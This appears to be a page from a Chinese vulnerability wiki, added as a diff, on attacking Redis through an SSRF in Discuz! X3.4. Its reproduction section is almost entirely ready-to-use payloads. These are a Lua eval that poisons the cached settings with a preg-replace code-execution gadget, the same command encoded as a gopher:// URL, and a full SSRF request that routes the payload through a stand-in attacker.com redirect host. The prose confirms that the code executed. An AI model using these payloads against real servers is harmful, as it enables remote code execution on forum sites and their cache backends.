@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Discuz/Discuz%21%20X3.4%20ssrf%20%E6%94%BB%E5%87%BBredis/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Discuz! X3.4 ssrf 攻击redis - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Discuz! X3.4 ssrf \u653b\u51fbredis", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_4" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Discuz%21%20X3.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Discuz%21%20X3.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Discuz! X3.4 任意文件删除漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Discuz%21%20X3.4%20imgcropper%20ssrf/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Discuz%21%20X3.4%20imgcropper%20ssrf/" class="btn btn-xs btn-link">
+        Discuz! X3.4 imgcropper ssrf
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="discuz-x34-ssrf-redis">Discuz! X3.4 ssrf 攻击redis<a class="headerlink" href="#discuz-x34-ssrf-redis" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>需要得到authkey</p>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>Discuz x3.4</p>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p>类似地，Dz 整合 Redis
+配置成功后，默认情况下网站首页右下角会出现<code>Redis On</code>的标志：</p>
+<p><img alt="" src="../resource/Discuz%21X3.4ssrf%E6%94%BB%E5%87%BBredis/media/rId24.jpg" /></p>
+<p>SSRF 攻击 Redis 步骤实际上就比攻击 Memcache 简单了，因为 Redis 支持 lua
+脚本，可以直接用 lua
+脚本获取缓存键名而无需再去猜解前缀。当然能成功攻击的前提是 Redis
+没有配置密码认证，Discuz requirepass 那一项为空：</p>
+<p><img alt="" src="../resource/Discuz%21X3.4ssrf%E6%94%BB%E5%87%BBredis/media/rId25.jpg" /></p>
+<p>Redis 交互命令行执行 lua 脚本：</p>
+<div class="codehilite"><pre><span></span><code><span class="n">eval</span><span class="w"> </span><span class="s">&quot;local t=redis.call(&#39;keys&#39;,&#39;*_setting&#39;); for i,v in ipairs(t) do redis.call(&#39;set&#39;, v, &#39;a:2:{s:6:</span><span class="se">\&quot;</span><span class="s">output</span><span class="se">\&quot;</span><span class="s">;a:1:{s:4:</span><span class="se">\&quot;</span><span class="s">preg</span><span class="se">\&quot;</span><span class="s">;a:2:{s:6:</span><span class="se">\&quot;</span><span class="s">search</span><span class="se">\&quot;</span><span class="s">;a:1:{s:7:</span><span class="se">\&quot;</span><span class="s">plugins</span><span class="se">\&quot;</span><span class="s">;s:4:</span><span class="se">\&quot;</span><span class="s">/.*/</span><span class="se">\&quot;</span><span class="s">;}s:7:</span><span class="se">\&quot;</span><span class="s">replace</span><span class="se">\&quot;</span><span class="s">;a:1:{s:7:</span><span class="se">\&quot;</span><span class="s">plugins</span><span class="se">\&quot;</span><span class="s">;s:9:</span><span class="se">\&quot;</span><span class="s">phpinfo()</span><span class="se">\&quot;</span><span class="s">;}}}s:13:</span><span class="se">\&quot;</span><span class="s">rewritestatus</span><span class="se">\&quot;</span><span class="s">;i:1;}&#39;) end; return 1;&quot;</span><span class="w"> </span><span class="mh">0</span>
+</code></pre></div>
+
+<p><img alt="" src="../resource/Discuz%21X3.4ssrf%E6%94%BB%E5%87%BBredis/media/rId26.jpg" /></p>
+<p>同样地，对这个过程抓包，将数据包改成 gopher 的形式：</p>
+<div class="codehilite"><pre><span></span><code><span class="nl">gopher:</span><span class="c1">//localhost:6379/_*3%0d%0a%244%0d%0aeval%0d%0a%24264%0d%0alocal%20t%3Dredis.call(&#39;keys&#39;%2C&#39;*_setting&#39;)%3B%20for%20i%2Cv%20in%20ipairs(t)%20do%20redis.call(&#39;set&#39;%2C%20v%2C%20&#39;a%3A2%3A%7Bs%3A6%3A%22output%22%3Ba%3A1%3A%7Bs%3A4%3A%22preg%22%3Ba%3A2%3A%7Bs%3A6%3A%22search%22%3Ba%3A1%3A%7Bs%3A7%3A%22plugins%22%3Bs%3A4%3A%22%2F.*%2F%22%3B%7Ds%3A7%3A%22replace%22%3Ba%3A1%3A%7Bs%3A7%3A%22plugins%22%3Bs%3A9%3A%22phpinfo()%22%3B%7D%7D%7Ds%3A13%3A%22rewritestatus%22%3Bi%3A1%3B%7D&#39;)%20end%3B%20return%201%3B%0d%0a%241%0d%0a0%0d%0a</span>
+</code></pre></div>
+
+<p>SSRF 利用：</p>
+<div class="codehilite"><pre><span></span><code><span class="nl">http:</span><span class="c1">//target/plugin.php?id=wechat:wechat&amp;ac=wxregister&amp;username=vov&amp;avatar=http%3A%2F%2Fattacker.com%2F302.php%3Furl%3DZ29waGVyOi8vbG9jYWxob3N0OjYzNzkvXyozJTBkJTBhJTI0NCUwZCUwYWV2YWwlMGQlMGElMjQyNjQlMGQlMGFsb2NhbCUyMHQlM0RyZWRpcy5jYWxsKCdrZXlzJyUyQycqX3NldHRpbmcnKSUzQiUyMGZvciUyMGklMkN2JTIwaW4lMjBpcGFpcnModCklMjBkbyUyMHJlZGlzLmNhbGwoJ3NldCclMkMlMjB2JTJDJTIwJ2ElM0EyJTNBJTdCcyUzQTYlM0ElMjJvdXRwdXQlMjIlM0JhJTNBMSUzQSU3QnMlM0E0JTNBJTIycHJlZyUyMiUzQmElM0EyJTNBJTdCcyUzQTYlM0ElMjJzZWFyY2glMjIlM0JhJTNBMSUzQSU3QnMlM0E3JTNBJTIycGx1Z2lucyUyMiUzQnMlM0E0JTNBJTIyJTJGLiolMkYlMjIlM0IlN0RzJTNBNyUzQSUyMnJlcGxhY2UlMjIlM0JhJTNBMSUzQSU3QnMlM0E3JTNBJTIycGx1Z2lucyUyMiUzQnMlM0E5JTNBJTIycGhwaW5mbygpJTIyJTNCJTdEJTdEJTdEcyUzQTEzJTNBJTIycmV3cml0ZXN0YXR1cyUyMiUzQmklM0ExJTNCJTdEJyklMjBlbmQlM0IlMjByZXR1cm4lMjAxJTNCJTBkJTBhJTI0MSUwZCUwYTAlMGQlMGE%253D&amp;wxopenid=xxxyyyzzz</span>
+</code></pre></div>
+
+<p>代码即再次执行成功。</p>
+<h2 id="_4">参考链接<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><a href="https://zhuanlan.zhihu.com/p/51907363">https://zhuanlan.zhihu.com/p/51907363</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Discuz%21%20X3.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Discuz%21%20X3.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Discuz! X3.4 任意文件删除漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Discuz%21%20X3.4%20imgcropper%20ssrf/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Discuz%21%20X3.4%20imgcropper%20ssrf/" class="btn btn-xs btn-link">
+        Discuz! X3.4 imgcropper ssrf
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
